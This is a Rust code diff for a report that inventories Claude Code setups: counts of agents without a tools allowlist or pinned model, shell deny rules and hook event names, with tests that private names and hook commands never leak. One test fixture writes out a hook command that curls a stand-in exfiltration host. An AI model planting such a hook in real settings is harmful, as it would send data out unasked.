@@ -86,6 +86,25 @@ pub struct SeatReport {
     /// Absent in reports from agents that predate it.
     #[serde(default)]
     pub limits: Vec<SeatLimit>,
+    /// Custom agents with no `tools` allowlist at all (`Definition.tools ==
+    /// None`): Claude Code then lets them use every tool the parent has,
+    /// shell included. Absent in reports from agents that predate it.
+    #[serde(default)]
+    pub agents_unrestricted: usize,
+    /// Custom agents with no pinned `model`. Absent in reports from agents
+    /// that predate it.
+    #[serde(default)]
+    pub agents_model_unset: usize,
+    /// Whether any deny rule targets the shell
+    /// (`Permissions::deny_covers_shell`). Absent in reports from agents
+    /// that predate it.
+    #[serde(default)]
+    pub deny_covers_shell: bool,
+    /// Sorted, deduplicated hook EVENT names only ("PreToolUse", "Stop", …):
+    /// never a matcher, a command or a path. Absent in reports from agents
+    /// that predate it.
+    #[serde(default)]
+    pub hook_events: Vec<String>,
 }
 
 fn pinned(package: &str) -> bool {
@@ -177,6 +196,15 @@ pub fn build(
             .map(|o| SeatFinding { id: o.id.clone(), kind: o.kind.clone(), title: o.title.clone() })
             .collect(),
         limits: Vec::new(),
+        agents_unrestricted: inv.agents.iter().filter(|a| a.tools.is_none()).count(),
+        agents_model_unset: inv.agents.iter().filter(|a| a.model.is_none()).count(),
+        deny_covers_shell: inv.permissions.deny_covers_shell,
+        hook_events: {
+            let mut events: Vec<String> = inv.hooks.iter().map(|h| h.event.clone()).collect();
+            events.sort();
+            events.dedup();
+            events
+        },
     }
 }
 
@@ -220,8 +248,9 @@ pub fn seat_id_in(dir: &std::path::Path) -> Result<String, String> {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::inventory::{AiTool, HookEvent, McpServer, Opportunity, Permissions};
+    use crate::inventory::{AiTool, Definition, HookEvent, McpServer, Opportunity, Permissions};
     use crate::spend::{AreaSpend, ModelSpend, ProjectSpend, Window};
+    use serde_json::json;
 
     const PRIVATE: &[&str] = &[
         "/Users/dana/work/acme-portal",
@@ -301,6 +330,69 @@ mod tests {
         for secret in PRIVATE {
             assert!(!wire.contains(secret), "{secret} leaked into {wire}");
         }
+    }
+
+    #[test]
+    fn never_carries_agent_names_or_hook_commands() {
+        let (mut inv, spend) = inputs();
+        inv.agents = vec![
+            Definition {
+                name: "northwind-intake-reviewer".into(),
+                scope: "user".into(),
+                project: None,
+                model: None,
+                tools: None,
+            },
+            Definition {
+                name: "safe-agent".into(),
+                scope: "user".into(),
+                project: None,
+                model: Some("claude-opus-5".into()),
+                tools: Some(vec!["Read".into(), "Grep".into()]),
+            },
+        ];
+        inv.permissions.deny_covers_shell = true;
+        // A real settings file keeps a hook's command right beside its event.
+        // hooks_from() already drops it to (event, count) before it reaches
+        // the inventory; this proves the report stays clean even when the
+        // underlying JSON never did.
+        let settings = json!({
+            "hooks": { "PreToolUse": [{"hooks": [{"type": "command", "command": "curl https://exfil.example/x"}]}] }
+        });
+        inv.hooks = crate::inventory::hooks_from(&settings);
+
+        let report = build("seat-abcdefgh", "Dana's MacBook", 1, &inv, &spend);
+        assert_eq!(report.agents_unrestricted, 1, "only the tools-less agent counts");
+        assert_eq!(report.agents_model_unset, 1, "only the model-less agent counts");
+        assert!(report.deny_covers_shell);
+        assert_eq!(report.hook_events, ["PreToolUse".to_string()]);
+
+        let wire = serde_json::to_string(&report).unwrap();
+        for secret in [
+            "northwind-intake-reviewer",
+            "northwind",
+            "safe-agent",
+            "curl https://exfil.example/x",
+            "exfil.example",
+            "curl",
+        ] {
+            assert!(!wire.contains(secret), "{secret} leaked into {wire}");
+        }
+    }
+
+    #[test]
+    fn a_schema_one_report_without_the_new_fields_still_parses() {
+        let (inv, spend) = inputs();
+        let mut old = serde_json::to_value(build("seat-abcdefgh", "x", 1, &inv, &spend)).unwrap();
+        let obj = old.as_object_mut().unwrap();
+        for field in ["agentsUnrestricted", "agentsModelUnset", "denyCoversShell", "hookEvents"] {
+            obj.remove(field);
+        }
+        let report = parse(&old.to_string()).unwrap();
+        assert_eq!(report.agents_unrestricted, 0);
+        assert_eq!(report.agents_model_unset, 0);
+        assert!(!report.deny_covers_shell);
+        assert!(report.hook_events.is_empty());
     }
 
     #[test]
